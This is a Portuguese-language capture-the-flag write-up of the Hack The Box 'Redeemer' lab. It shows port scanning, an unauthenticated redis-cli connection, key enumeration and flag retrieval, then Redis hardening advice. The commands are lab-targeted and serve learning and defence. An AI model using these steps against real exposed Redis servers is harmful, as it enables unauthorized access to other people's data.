## HTB: Redeemer
### 📋 Informações da Máquina

 - Plataforma: Hack the Box
 - Máquina: Redeemer
 - Dificuldade: Muito Fácil
 - Ip: 10.129.35.253


## ⚙️ 0. Resumo
Essa máquina ainda é muito fácil, pois estou no starting point do hack the box, essa maquina envolve a exploração da falta de autenticação de um serviço exposto redis exposto na rede

### ⚠️ 0.1 VULNERABILIDADES IDENTIFICADAS

- Serviço Redis exposto na internet

- Ausência total de autenticação

- Porta 6379 acessível publicamente

- Versão desatualizada (5.0.7)


## 🔍 1. ENUMERAÇÃO
### 1.1 Varredura de Portas

Como já tinha informação sobre o serviço Redis, fiz um scan direto na porta padrão:

```bash
nmap -sV -p 6379 10.129.35.253
```

📊 Resultado:

```bash
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value 5.0.7
```  

✅ Conclusão: Serviço Redis encontrado e exposto publicamente.


## ⚡ 2. EXPLORAÇÃO
2.1 Conexão com o Redis

```bash
redis-cli -h 10.129.35.253
```

### 2.2 Enumeração de Dados

Dentro do Redis, usei comandos para explorar o banco:
redis
```bash
KEYS *
```

🎯 Resultado:

```bash
1) "flag"
2) "stor"
3) "numb"
4) "temp"
```

### 2.3 Captura da Flag
Usei um comando pra extrair o conteudo da key "flag"
```bash
GET flag
```

🏴 Flag Capturada:
```bash
flag{...}
```

## 🔎 3. PÓS-EXPLORAÇÃO
### 3.1 Análise de Configuração

Verifiquei as configurações do serviço:
```bash
CONFIG GET requirepass
CONFIG GET bind
INFO server
```

📝 Configurações Perigosas Encontradas:

  ❌ Sem senha (requirepass vazio)

  🌐 Bind em todas interfaces (0.0.0.0)

  🔓 Modo protegido desativado

### 3.2 Dados Adicionais Encontrados
```bash
GET stor
GET numb  
GET temp
```

## ⚠️ VULNERABILIDADES IDENTIFICADAS

- Serviço Redis exposto na internet

- Ausência total de autenticação

- Porta 6379 acessível publicamente

- Versão desatualizada (5.0.7)

## 🛡️ 4. RECOMENDAÇÕES DE SEGURANÇA

- 1. Configurar senha forte
echo "requirepass Su@SenhaF0rt3!2024" >> /etc/redis/redis.conf

- 2. Restringir acesso
echo "bind 127.0.0.1" >> /etc/redis/redis.conf

- 3. Ativar modo protegido
echo "protected-mode yes" >> /etc/redis/redis.conf

- 4. Reiniciar serviço
systemctl restart redis-server


## 🎯 5. CONCLUSÃO
#### Resumo do Ataque:

- Complexidade: Baixa

- Impacto: Alto (dados expostos)

#### Lições Aprendidas:

  1. Nunca exponha serviços de banco diretamente na internet

  2. Autenticação é OBRIGATÓRIA para qualquer serviço

  3. Firewalls previnem exposição acidental

  4. Versões atualizadas têm menos vulnerabilidades

#### Reflexão Pessoal:

"Esta máquina reforçou que a falta de autenticação é um dos erros mais comuns e perigosos. Senhas fortes são essenciais, mas a prevenção começa na arquitetura - serviços internos não devem ser expostos publicamente!"

✅ Máquina Finalizada com Sucesso!

Write-up por: Luiz A. | Hack The Box - Redeemer | 15/10/25
